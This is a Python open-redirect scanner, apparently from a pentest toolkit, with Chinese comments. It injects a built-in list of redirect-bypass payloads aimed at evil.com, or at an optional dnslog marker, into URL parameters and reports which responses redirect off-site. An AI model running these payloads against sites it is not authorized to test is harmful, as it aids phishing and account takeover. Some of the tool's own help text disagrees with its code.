#!/usr/bin/env python3
"""xsredir.py — 开放重定向检测（AI 友好，xs-bigdan 工具矩阵）

设计目标（对齐 xsreq/xsenum 的"差异一眼可见"思想）：
- 对给定 URL 模板的指定参数，逐个注入重定向 payload；
- 每条结果一行：`[状态] 参数 | payload | Location | 判定`，判定五级一眼可读；
- 同域/子域跳转自动标"常见误报"（UrlRedirectScan 作者文档承认的误报模式）；
- Location 头含检测标记 = 跳转实锤；配合 OOB 标记可测盲打场景。

用法:
  xsredir.py "https://target.com/login?next=FUZZ"                  # 单参数 FUZZ 占位
  xsredir.py "https://target.com/login" --params next,redirect,url  # 自动拼参数逐个测
  xsredir.py "https://t.com/jump?to=FUZZ" --oob xxx.dnslog.cn       # 追加 OOB 盲打(替换标记)
  xsredir.py "https://t.com/?url=FUZZ" --payload-file my.txt       # 自带字典

输出示例:
  [302] redirect | https://www.evil.com | Location: https://www.evil.com | 跳转实锤 ✅
  [302] url | https://sub.target.com/x | Location: https://sub.target.com/x | 同域跳转(常见误报) ⚠
  [200] next | https://www.evil.com | (无 Location,页面 200) | 未触发 ✗

判定说明:
  跳转实锤 ✅      = Location 头包含检测标记(evil.com/你的 OOB 域) —— 可直接写 FINDING
  同域跳转 ⚠       = 跳到目标自身域/子域——功能性行为,常见误报,默认不算洞
  未触发 ✗ / 异常 ! = 该组合无跳转或请求失败
证据: --save 时全量落盘（与 xsreq 同格式），供 FINDING 行引用。
"""
from __future__ import annotations

import argparse
import json
import re
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

DEFAULT_MARKER = "evil.com"

DEFAULT_PAYLOADS = [
    "https://www.{MARKER}",
    "https://www.{MARKER}%23",
    "https://www.{MARKER}%3F",
    "https://www.{MARKER}%5C%2E",
    "https://www.{MARKER}%5C%40",
    "https://www.{MARKER}%E3%80%82",
    "https://www.{MARKER}%E3%80%82%40",
    "https://www.{MARKER}:80%40www.google.com",
    "https://%40www.{MARKER}",
    "//www.{MARKER}",
    "///www.{MARKER}",
    "https:/\\//www.{MARKER}",
    "\\/\\/www.{MARKER}",
    "https://%2f%2fwww.{MARKER}",
    "https://www.google.com@www.{MARKER}",
    "https://www.{MARKER}.google.com",
    "https://www.google.com。\u3002www.{MARKER}",
    "%2f%2fwww.{MARKER}",
    "..%2f%2fwww.{MARKER}",
    "/%2f%2fwww.{MARKER}",
    "//%09/www.{MARKER}",
]

DEFAULT_PARAMS = [
    "next", "redirect", "redirect_to", "redirect_url", "return_url", "returnUrl",
    "url", "uri", "jump", "jump_to", "target", "domain", "link", "linkto",
    "_backurl", "bkUrl", "useruri", "rurl", "callback", "continue", "dest", "goto",
    "redir", "r", "u", "ReturnUrl", "redirectUri",
]


def load_payloads(path: str | None) -> list[str]:
    payloads = list(DEFAULT_PAYLOADS)
    if path:
        extra = []
        for ln in open(path, encoding="utf-8", errors="replace"):
            ln = ln.strip()
            if ln and not ln.startswith("#"):
                extra.append(ln)
        payloads = extra  # 自带字典=完全替换(与 xsenum --wordlist 同语义)
    return payloads


def _reg_domain(host: str) -> str:
    """取注册域(近似: 最后两段;对 co.jp 类不完美,但 FP 过滤够用)。"""
    parts = host.split(".")
    return ".".join(parts[-2:]) if len(parts) >= 2 else host


def _classify(status: int, headers: dict, body: str, marker: str, target_host: str) -> str:
    loc = headers.get("location", "")
    if marker in loc or marker in body[:2000]:
        return "跳转实锤 ✅"
    meta = re.search(r'http-equiv=["\']?refresh["\']?[^>]*url=([^"\'>\s]+)', body[:3000], re.I)
    if meta and marker in meta.group(1):
        return "meta refresh 跳转 ✅"
    if 300 <= status < 400 and loc:
        try:
            lh = (urllib.parse.urlparse(loc).hostname or "").lower()
        except ValueError:
            lh = ""
        if lh and (lh == target_host or lh.endswith("." + target_host)
                   or _reg_domain(lh) == _reg_domain(target_host)):
            return "同域跳转(常见误报) ⚠"
        return "外域 30x ⚠(人工看 Location)"
    if marker in body:
        return "响应回显标记 ⚠(可能是回显非跳转,对照判定门)"
    return "未触发 ✗"


def main() -> int:
    ap = argparse.ArgumentParser(description="开放重定向检测(xs-bigdan 工具矩阵)")
    ap.add_argument("url", help='URL 模板: 参数值用 FUZZ 占位(如 "https://t.com/login?next=FUZZ");'
                                '或给不含参数的基础 URL,配合 --params 自动拼接')
    ap.add_argument("--params", help="逗号分隔的参数名列表(配合无参数的基础 URL 逐个拼参测试)")
    ap.add_argument("--payload-file", help="自带 payload 字典(每行一个,{MARKER} 为标记占位;默认内置 24 条)")
    ap.add_argument("--marker", default=DEFAULT_MARKER, help="检测标记域名(默认 www.evil.com;OOB 场景换成你的 dnslog 域)")
    ap.add_argument("--oob", help="额外追加 OOB 盲打: 值为你的 dnslog/OOB 域(每个参数多测一条)")
    ap.add_argument("--limit", type=int, default=30, help="body 摘录上限")
    ap.add_argument("--timeout", type=int, default=12, help="单请求超时秒")
    ap.add_argument("--save", help="证据落盘文件(全量请求/响应,与 xsreq --save 同格式)")
    ap.add_argument("--insecure", action="store_true", help="跳过 SSL 验证")
    args = ap.parse_args()

    marker = args.marker
    payloads = [p.replace("{MARKER}", marker) for p in load_payloads(args.payload_file)]
    if args.oob:
        payloads.append(f"https://{args.oob}/oob")  # OOB 盲打: 换标记为 OOB 域
        marker_oob = args.oob
    else:
        marker_oob = ""

    url_tpl = args.url
    tests: list[tuple[str, str]] = []  # (param_name, full_url)
    if "FUZZ" in url_tpl:
        for pl in payloads:
            tests.append((url_tpl.split("?")[-1].split("=")[0], url_tpl.replace("FUZZ", urllib.parse.quote(pl, safe=""))))
    elif args.params:
        base = url_tpl + ("&" if "?" in url_tpl else "?")
        for pn in [p.strip() for p in args.params.split(",") if p.strip()]:
            for pl in payloads:
                tests.append((pn, f"{base}{pn}={urllib.parse.quote(pl, safe='')}"))
    else:
        sys.exit("[!] URL 模板需含 FUZZ 占位,或用 --params 给出参数名列表")

    ctx = ssl.create_default_context()
    if args.insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    # 禁跟重定向:必须读到 302 响应本身的 Location(默认 handler 会自动跟跳,
    # 302 会被跟随到 payload 域名——那时再读到的就是目标域的最终响应,检测全废)
    class _NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):  # noqa: ARG002
            return None
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}), _NoRedirect(),
                                         urllib.request.HTTPSHandler(context=ctx))

    t_host = (urllib.parse.urlparse(url_tpl).hostname or "").lower()
    print(f"=== xsredir {url_tpl} | 测试组合 {len(tests)} | 标记 {marker} ===")
    hits, rows, evidence = [], [], []
    for param, full in tests:
        t0 = time.monotonic()
        status, headers, body = 0, {}, ""
        try:
            req = urllib.request.Request(full, headers={"User-Agent": "xs-bigdan/0.1 (authorized pentest agent)"})
            r = opener.open(req, timeout=args.timeout)
            status = r.status
            headers = dict(r.headers.items())
            body = r.read(6000).decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            status = e.code
            headers = dict(e.headers.items())
            body = e.read(6000).decode("utf-8", errors="replace")
        except OSError as e:
            rows.append(f"[!] {param} | {full[:80]} | {type(e).__name__} | 异常 !")
            continue
        elapsed = time.monotonic() - t0
        lower = {k.lower(): v for k, v in headers.items()}
        verdict = _classify(status, lower, body, marker_oob or marker, t_host)
        loc = lower.get("location", "")[:120]
        rows.append(f"[{status}] {param} | {pl_frag(full)} | Location: {loc} | {verdict} ({elapsed:.2f}s)")
        if "✅" in verdict:
            hits.append((param, full, verdict))
            evidence.append((param, full, status, headers, body))

    # 汇总:实锤在前
    for r in rows:
        print(r)
    print(f"--- {sum(1 for r in rows if '✅' in r)}/{len(rows)} 跳转实锤;"
          f"{sum(1 for r in rows if '⚠' in r)} 条待人工 ---")
    for param, full, verdict in hits:
        print(f"HIT: 参数={param} 判定={verdict}")
        print(f"     复现: {full}")
    if args.save and evidence:
        with open(args.save, "w", encoding="utf-8") as f:
            f.write(f"# saved by xsredir.py 标记={marker}\n\n")
            for param, full, status, headers, body in evidence:
                f.write(f"=== HIT {param} ===\nGET {full}\n\n")
                f.write("=== RESPONSE ===\n" + "\n".join(f"{k}: {v}" for k, v in headers.items())
                        + "\n\n" + body[:3000] + "\n\n")
        print(f"[saved] {args.save}")
    return 0 if hits else 0  # 未命中也是有效结论(信息性退出)


def pl_frag(url: str, n: int = 90) -> str:
    return url if len(url) <= n else url[:n - 1] + "…"


if __name__ == "__main__":
    sys.exit(main())
